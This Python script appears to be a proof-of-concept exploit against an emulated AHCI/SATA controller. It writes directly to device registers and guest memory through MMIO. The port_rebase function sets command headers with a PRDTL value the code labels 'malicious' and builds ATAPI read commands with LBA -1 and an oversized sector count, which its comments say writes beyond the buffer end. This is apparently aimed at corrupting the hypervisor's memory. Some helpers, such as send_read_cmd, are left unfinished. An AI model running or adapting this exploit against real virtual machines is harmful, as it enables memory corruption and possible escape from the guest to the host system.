from periphery import MMIO

SECTOR_TEST1 = 0x40
SECTOR_TEST2 = 0x00

PRDTL_VALUE = 0x1300

# find an available place at: cat /proc/iomem 
AHCI_BASE = 0x20000
ADDR_MINUS = 0x6000

X86_LINEAR_OFFSET = 0xC0000000

mmio = MMIO(0xfebf1000, 0x2000)  #from lspci -vvvv
cap = mmio.read32(0x0)
ghc = mmio.read32(0x4)
_is = mmio.read32(0x8)
pi = mmio.read32(0xc)
vs = mmio.read32(0x10)


######################################################################
######################################################################

i = 0

############## HBA_PORT structure OFFSETS ##########
CLB_OFFSET = 0x00
CLBU_OFFSET = 0x04
FB_OFFSET = 0x08
FBU_OFFSET = 0x0C
IS_OFFSET = 0x10
IE_OFFSET = 0x14
CMD_OFFSET = 0x18
RSV0_OFFSET = 0x1C
TFD_OFFSET = 0X20
SIG_OFFSET = 0X24
SSTS_OFFSET = 0X28
STCL_OFFSET = 0X2C
SERR_OFFSET = 0X30
SACT_OFFSET = 0X34
CI_OFFSET = 0X38
SNTF_OFFSET = 0X3C
FBS_OFFSET = 0X40
#######################################################


SIZEOF_HBA_PORT = 0x80
HBA_PORT_START_OFFSET = 0x100

SATA_SIG_ATA = 0x101
SATA_SIG_ATAPI = 0xeb140101
SATA_SIG_SEMB = 0XC33C0101
SATA_SIG_PM = 0X96690101

AHCI_DEV_NULL = 0
AHCI_DEV_SATA = 1
AHCI_DEV_SEMB = 2
AHCI_DEV_PM   = 3
AHCI_DEV_SATAPI = 4

HBA_PORT_IPM_ACTIVE = 1
HBA_PORT_DET_PRESENT = 3

def get_port_offset(portno):
  return HBA_PORT_START_OFFSET + portno * SIZEOF_HBA_PORT

def pdata(portno, offset):
  return mmio.read32(get_port_offset(portno) + offset)

def wdata(portno, offset, value):
  return mmio.write32(get_port_offset(portno) + offset, value)

def check_type(portno):
  port_ssts  = pdata(portno, 0x28)
  ipm = (port_ssts >> 8) & 0x0f
  det = port_ssts & 0x0f
  if(det != HBA_PORT_DET_PRESENT):
    return AHCI_DEV_NULL
  if(ipm != HBA_PORT_IPM_ACTIVE):
    return AHCI_DEV_NULL

  port_sig =  pdata(portno, 0x24)
  if(port_sig == SATA_SIG_ATAPI):
    return AHCI_DEV_SATAPI
  if(port_sig == SATA_SIG_SEMB):
    return AHCI_DEV_SEMB
  if(port_sig == SATA_SIG_PM):
    return AHCI_DEV_PM
  return AHCI_DEV_SATA

def probe_port():
  pi_ = mmio.read32(0xc)
  for i in range(0, 31):
    if(pi_ & 1):
      dt = check_type(i)
      if(dt == AHCI_DEV_SATA):
        print("SATA drive found at port %d\n" % (i))
      elif(dt == AHCI_DEV_SATAPI):
        print("SATAPI drive found at port %d\n" % (i))
      elif(dt == AHCI_DEV_SEMB):
        print("SEMB drive found at port %d\n" % (i))
      elif(dt == AHCI_DEV_PM):
        print("PM drive found at port %d\n" % (i))
      else:
        print("NO drive found at port %d\n" % (i))
    pi_ >>= 1

def find_cmdslot(portno):
  target = -1
  slots =  pdata(portno, SACT_OFFSET) |  pdata(portno, CI_OFFSET)
  print("sact = %d, ci = %d" % (pdata(0, SACT_OFFSET), pdata(0, CI_OFFSET)))

  for i in range(0, 31):
    if(slots & 1 == 0):
      target = i
      break
    slots >>= 1
  return target

CMD_HEADER_CFL_OFFSET = 0 # bit 0-4
CMD_HEADER_A_OFFSET = 0   # bit 5
CMD_HEADER_W_OFFSET = 0   # bit 6
CMD_HEADER_P_OFFSET = 0   # bit 7

CMD_HEADER_R_OFFSET = 1   # bit 0
CMD_HEADER_B_OFFSET = 1   # bit 1
CMD_HEADER_C_OFFSET = 1   # bit 2
CMD_HEADER_RSV0_OFFSET = 1   # bit 3
CMD_HEADER_PMP_OFFSET = 1   # bit 4-7

CMD_HEADER_PRDTL_OFFSET = 2   # uint16
CMD_HEADER_PRDBC_OFFSET = 4   # uint32
CMD_HEADER_CTBA_OFFSET  = 8   # uint32
CMD_HEADER_CTBAU_OFFSET  = 12   # uint32

CMD_HEADER_SIZE = CMD_HEADER_CTBAU_OFFSET + 4            + (4 * 4)
#                 ^offset                   ^ size ctbau   ^ size rsv1[4] (reserved)

def send_read_cmd(portno, startl, starth, count):
  #port->is = -1 , write
  spin = 0
  slot = find_cmdslot(portno)
  if(slot == -1):
    return 0
  clb = pdata(portno, CLB_OFFSET) #also addr of cmd header
  cmdheader = clb
  cmdheader += get_port_offset(portno)
  #set cmdheader->cfl = sizeof(FIS_REG_H2D) / 4
  #set cmdheader->w = 0
  #set cmdheader->prdtl = (uint16_t)((count - 1) >> 4) + 1

def stop_cmd(portno):
  portcmd = pdata(portno, CMD_OFFSET)
  portcmd &= ~0x1
  portcmd &= ~0x10
  wdata(portno, CMD_OFFSET, portcmd)
  while(1):
    if(pdata(portno, CMD_OFFSET) & 0x4000):
      continue
    if(pdata(portno, CMD_OFFSET) & 0x8000):
      continue
    break


def start_cmd(portno):
  while(pdata(portno, CMD_OFFSET) & 0x8000):
    pass
  cmd = pdata(portno, CMD_OFFSET)
  cmd |= 0x10
  cmd |= 0x1
  wdata(portno, CMD_OFFSET, cmd)

SIZE_OF_CMDHDR = 2+2+4+8+4*4+256

def port_rebase(portno, maintain):
  if(maintain == 0):
    stop_cmd(portno)

  wdata(portno, CLB_OFFSET, AHCI_BASE + (portno << 10))
  wdata(portno, CLBU_OFFSET, 0)

  #1024: size of list entries
  #0x3000: preparing for the .. ctba | ctbau << 8 (256 bytes each)
  mmio_clb = MMIO(pdata(portno, CLB_OFFSET) , 1024 + 0x9000 + 0x3000 - 0x6000)
  if(maintain == 0):
    print("target addr= %x " % (pdata(portno, CLB_OFFSET)))
  for i in range(0, 1023, 0x20):
    mmio_clb.write16(i, 0xa5)        #opts
    mmio_clb.write16(i+2, PRDTL_VALUE)    #prdtl, malicious 
    mmio_clb.write32(i+4, 0)         #status 0

    #tbladdr_low
    clb_low = AHCI_BASE + (40 << 10) + (portno << 13) + (int(i / 0x20) << 8) - 0x6000
    mmio_clb.write32(i+8, clb_low)
    #tbladdr_high. tbladdr is used to store CMD_FIS structure. CMDLEN=0x80
    mmio_clb.write32(i+12, 0)

    if(maintain == 0):
      print("Cleaning memory for command table descriptor (ctba) %x " % (AHCI_BASE + (40 << 10) + (portno << 13) + (int(i / 0x20) << 8) - 0x6000))
    delta = clb_low - pdata(portno, CLB_OFFSET);
    for j in range(0, 255):
      mmio_clb.write8(i + delta, 0)
    
    mmio_clb.write32(i+16, 0)        #reserved  +16~+19
    mmio_clb.write32(i+20, 0)        #reserved  +20~+23
    mmio_clb.write32(i+24, 0)        #reserved  +24~+27
    mmio_clb.write32(i+28, 0)        #reserved  +28~+31

  #CMD_FIS:
  #see code in handle_cmd.  switch(cmd_fis[0]) --> SATA_FIS_TYPE_REGISTER_H2D --> reg.
  #
  # it's okay to set them to ALL ZERO:
  #
  #[3] -> feature;  . remember to (feature &= ~3). otherwise dma is used. we use only pio.
  #[4]->sector; 
  #[5][6]->lcyl hcyl; 
  #[7]->select; 
  #[8]->hob_selector
  #[9][10] -> hob_lcyl hob_hcyl; 
  #[11]->hob_feature; 
  #[12]|[13]<<8 -> nsector;
  #[14-19] reserved.  
  #[15] valid if UPDATE_COMMAND unset
  #
  # important:
  #
  # [2] FIS COMMAND -> ide_exec_command
  # when FIS COMMAND = WIN_PACKETCMD (0xA0)
  # cmd_packet --> ide_transfer_start with callback = ide_atapi_cmd --> CDROM
  #  ** s->feature cant have 0x02  (! (feature&0x02) )
  #  ** s->feature cant have 0x01  (! (feature&0x01) ), otherwise, atapi_dma is called.
  #
  # [0x40 - 0x4f] -> io_buffer
  # buf[0] = 0x28 (0xa8 is also okay but no)
  # buf[1] = 0x00, anything is okay
  # buf[2-5] = 0xff 0xff 0xff 0xff,  set lba to -1
  # buf[6] = 0x00, any. only valid if buf[0] is 0xa8
  # buf[7-10] = 0x00 0x08 0x00 0x00, just a big value, for example 0x0800. * 2048 later. this will write beyond the buffer end.
  # buf[11-15] = 0x00.  any, no use here.



  mmio_clb.close()
  if(maintain == 0):
    print("okk")
  
  ################################################################
  #preparing for FIS. 
  #  fb, fbu is FIS base address.
  ################################################################
  wdata(portno, FB_OFFSET, AHCI_BASE + (32 << 10) + (portno << 8) - 0x6000)
  wdata(portno, FBU_OFFSET, 0)

  #
  # FIS Entry Size = 256 per port. assume it's 32 ports.. (actually 1)
  #

  mmio_fb = MMIO(pdata(portno, FB_OFFSET)  , 256*32)

  if(maintain == 0):
    print("FIS base address = %x" % (pdata(portno, FB_OFFSET)))
    for i in range(0, 255):
      mmio_fb.write8(i, 0x0)
  
  mmio_fb.close()

  mmio_clb = MMIO(AHCI_BASE + (40 << 10) + (portno << 13) + (int(i / 0x20) << 8) - 0x6000, 0x2000)
  for i in range(0, 0x1fff, 0x100):
    mmio_clb.write8(i + 0x00, 0x27)  # SATA_FIS_TYPE_REGISTER_H2D
    mmio_clb.write8(i + 0x01, 0x80)  # SATA_FIS_REG_H2D_UPDATE_COMMAND_REGISTER
    mmio_clb.write8(i + 0x02, 0xA0)  # WIN_PACKETCMD (0xA0)
    mmio_clb.write8(i + 0x06, 0x08)  #  SET HCYL TO 8, PREVENT FAILED BCL CHECK.
    mmio_clb.write8(i + 0x40, 0xA8)  # ATAPI: CMD_READ
    mmio_clb.write32(i + 0x42, 0xFFFFFFFF)  # LBA: -1
    mmio_clb.write8(i + 0x46, 0x00)  # NSECTORS: 0x80000
    mmio_clb.write8(i + 0x47, 0x00)  # NSECTORS:  
    mmio_clb.write8(i + 0x48, SECTOR_TEST1)  # NSECTORS: 
    mmio_clb.write8(i + 0x49, SECTOR_TEST2)  # NSECTORS: big endian

    # 00 00 00 00 | 00 03 00 00  (0x30000)
    # in little endian:
    # 00 00 03 00 | 00 00 00 00
    mmio_clb.write32(i + 0x80 + 0, 0x00000300)     # 0x80: AHCI_SG.  +0x80: addr (64 bit) - littlendian
    mmio_clb.write32(i + 0x80 + 4, 0x00000000)     # 0x84:  addr - higher bits

    mmio_clb.write32(i + 0x80 + 12, 0xffffffff)  # 0x80 + 12(DEC): flags_size
  mmio_clb.close()
 
  if(maintain == 0):
    start_cmd(portno)

######################################################################
##probe port
######################################################################

probe_port()

avail_port = find_cmdslot(0)

if(avail_port == -1):
  print("cannot find a valid slot!\n")
else:
  print("find valid slot %d" % (avail_port))

clb = pdata(0, CLB_OFFSET)
print("%08x" % (clb))

port_rebase(0, 0)

mmio.close()



